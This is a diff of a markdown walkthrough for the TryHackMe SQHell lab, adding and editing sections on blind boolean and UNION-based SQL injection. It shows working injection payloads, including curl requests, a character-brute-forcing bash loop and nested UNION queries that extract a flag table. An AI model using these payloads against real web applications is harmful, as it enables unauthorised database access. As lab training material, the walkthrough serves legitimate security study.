@@ -2,7 +2,7 @@
 
 **Room Link:** [https://tryhackme.com/room/sqhell](https://tryhackme.com/room/sqhell)
 
-
+[https://pencer.io/ctf/ctf-thm-sqhell/#flag-4---out-of-band---browser-method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-4---out-of-band---browser-method)
 
 ## **Scans**
 
@@ -149,48 +149,13 @@ python flag.py
 
 ## Flag 3 - Blind/Boolean - Curl Method
 
-## [Walk-through of SQHell from TryHackMe](https://pencer.io/ctf/ctf-thm-sqhell/) <a href="#page-title" id="page-title"></a>
+&#x20;
 
-&#x20;June 23, 2021  40 minute read
+### &#x20;<a href="#machine-information" id="machine-information"></a>
 
-&#x20;**On this page**
 
-* [Machine Information](https://pencer.io/ctf/ctf-thm-sqhell/#machine-information)
-* [SQL Injection Info](https://pencer.io/ctf/ctf-thm-sqhell/#sql-injection-info)
-* [Initial Access](https://pencer.io/ctf/ctf-thm-sqhell/#initial-access)
-* [Flag 1 - In-Band/Error Based - Browser Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---browser-method)
-* [Flag 1 - In-Band/Error Based - Curl Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---curl-method)
-* [Flag 1 - In-Band/Error Based - Burp Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---burp-method)
-* [Flag 1 - In-Band/Error Based - SQLMap Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---sqlmap-method)
-* [Flag 5 - In-Band/Union - Browser Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-5---in-bandunion---browser-method)
-* [Flag 5 - In-Band/Union - Curl Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-5---in-bandunion---curl-method)
-* [Flag 5 - In-Band/Union - SQLMap Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-5---in-bandunion---sqlmap-method)
-* [Flag 3 - Blind/Boolean - Browser Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-3---blindboolean---browser-method)
-* [Flag 3 - Blind/Boolean - Curl Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-3---blindboolean---curl-method)
-* [Flag 3 - Blind/Boolean - SQLMap Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-3---blindboolean---sqlmap-method)
-* [Flag 2 - Blind/Time - Curl Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-2---blindtime---curl-method)
-* [Flag 2 - Blind/Time - SQLMap Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-2---blindtime---sqlmap-method)
-* [Flag 4 - Out-of-band - Browser Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-4---out-of-band---browser-method)
-* [Flag 4 - Out-of-band - Curl Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-4---out-of-band---curl-method)
-* [Flag 4 - Out-of-band - SQLMap Method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-4---out-of-band---sqlmap-method)
 
-### Machine Information[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#machine-information) <a href="#machine-information" id="machine-information"></a>
-
-![sqhell](https://pencer.io/assets/images/2021-06-21-16-56-36.png)
-
-SQHell is a medium difficulty room on TryHackMe. Instead of the usual capture the flag style experience this room is designed to help you develop your SQL injection skills. There are five flags to capture, and each requires a different type of SQLi to retrieve it. Areas covered are in-band, out-of-band and blind. I show you different ways for each type including browser, Curl, Burp and SQLMap methods.
-
-Skills required are basic SQL injection knowledge and understanding of the different types. Skills gained are ways to exploit the five most common types of vulnerabilities using a variety of methods.
-
-| Details              |                                                                                   |
-| -------------------- | --------------------------------------------------------------------------------- |
-| Hosting Site         | [TryHackMe](https://tryhackme.com/)                                               |
-| Link To Machine      | [THM - Medium - SQHell](https://tryhackme.com/room/sqhell)                        |
-| Machine Release Date | 7th April 2021                                                                    |
-| Date I Completed It  | 21st June 2021                                                                    |
-| Distribution Used    | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |
-
-### SQL Injection Info[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#sql-injection-info) <a href="#sql-injection-info" id="sql-injection-info"></a>
+### SQL Injection Info <a href="#sql-injection-info" id="sql-injection-info"></a>
 
 Looking at the room description we’re told specifically to find five different flags using various types SQL injection:
 
@@ -214,7 +179,7 @@ For BurpSuite I’m using FoxyProxy to redirect my browser to it. Here’s the c
 
 ![sqhell-foxy-burp](https://pencer.io/assets/images/2021-06-08-22-36-12.png)
 
-### Initial Access[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#initial-access) <a href="#initial-access" id="initial-access"></a>
+### Initial Access[Permalin](https://pencer.io/ctf/ctf-thm-sqhell/#initial-access) <a href="#initial-access" id="initial-access"></a>
 
 First let’s add the server IP to our hosts file:
 
@@ -865,7 +830,7 @@ curl "http://$VICTIM/register/user-check?username=admin' AND (length(database())
 
 This tells us the database name length isn’t 1 character long. Next we try two characters:
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -875,7 +840,7 @@ curl "http://$VICTIM/register/user-check?username=admin' AND (length(database())
 
 Same answer for two characters, so we continue adding one and testing until we get a false:
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Same answer for two characters, so we continue adding one and testing until we get a false:
 
@@ -885,7 +850,7 @@ Same answer for two characters, so we continue adding one and testing until we g
 curl "http://$VICTIM/register/user-check?username=admin' AND (length(database())) = 8 --+"
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 This tells us the length of the name of the database is eight characters. Now we want to find what those eight characters are, we can cheat a little as we can guess it’s in the same format as the previous flags. So with the knowledge that it is probably sqhell\_3 let’s test the first character. To do this we need to know the ASCII code for lower case s, which is 115 known by looking at [this](http://www.asciitable.com/) handy table.
 
@@ -897,7 +862,7 @@ Let’s see if the first character is equal to s:
 curl "http://$VICTIM/register/user-check?username=admin' AND (ascii(substr((select database()),1,1))) = 115 --+"
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 False tells us the letter isn’t available, or in other words there is a match. So we’ve confirmed the first character is s, let’s check for q. I also made this one liner to loop through all uncaptalize letters to make it easier.
 
@@ -907,7 +872,7 @@ False tells us the letter isn’t available, or in other words there is a match.
 for (( i=0; i<=255; i++ )); do curl "http://$VICTIM/register/user-check?username=admin' AND (ascii(substr((select database()),2,1))) = $i  --+" && echo "Val: $i";  done
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 I kept doing this until the last eighth character. Writing down the results to convert to ASCII
 
@@ -919,7 +884,7 @@ for (( i=0; i<=255; i++ )); do curl "http://$VICTIM/register/user-check?username
 
 Link: [https://onlinetools.com/ascii/convert-decimal-to-ascii](https://onlinetools.com/ascii/convert-decimal-to-ascii)
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 We’ve confirmed the database is called sqhell\_3. Next we would use the same technique to get the table names in the database, of course that would be a long a laborious process. Used this script to get the flag.
 
@@ -950,5 +915,97 @@ print("Flag found: ", flag)
 python flag.py
 ```
 
+<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+
+## Flag 4
+
+### Out-of-band - Browser Method <a href="#flag-4---out-of-band---browser-method" id="flag-4---out-of-band---browser-method"></a>
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+We see her just like on the posts page there is a parameter. Let’s test to see if we can inject like before:
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Adding AND 1=1 results in a true statement which proves we can inject here. Now we need to determine the number of columns in the table just like we did for flag 5. We do this the same way using the ORDER BY statement.
+
+So just like before we start with ORDER BY 1, then ORDER BY 2, and so on until we get to ORDER BY 4 where we see an error:
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Now we know how many columns we have we can use a UNION statement to test which ones are visible:
+
+```
+http://$VICTIM/user?id=1337 union select 1,2,3
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Here we’ve used a false ID, which would result in an error but instead we’ve used the UNION statement to retrieve the column numbers. Now we know column one and two are useable we can retrieve the user and database:
+
+```
+http://$VICTIM/user?id=1337 union select database(),user(),null
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+Next we want to see the tables in the database and can use the same query as before:
+
+```
+http://$VICTIM/user?id=1337 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
+```
+
+However this time when we ask for all tables using group\_concat we only see the one user table:
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+We know a different database contains the posts table, but we find the expected flag table can’t be queried here. It’s at this point that we need to go back to the hint about running a query inside a query. And we again need to determine the number of columns:
+
+```
+http://$VICTM/user?id=1337 union select "1 order by 1-- -",2,3 from information_schema.tables where table_schema=database()
+```
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+Here I’ve just added an ORDER BY query to the end of the UNION SELECT 1, and enclosed it in quotes so it gets evaluated. As before we keep adding columns until we something changes:
+
+```
+http://sqhell.thm/user?id=1337 union select "1 order by 1,2,3,4,5-- -",2,3 from information_schema.tables where table_schema=database()
+```
+
 <figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+We can see at five columns the posts disappear. This tells us there are four columns. Now we can use the same query as before to get the flag from the flag table:
+
+```
+http://sqhell.thm/user?id=1337 union select "1 union select 1,flag,3,4 from flag-- -",2,3 from information_schema.tables where table_schema=database()
+```
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
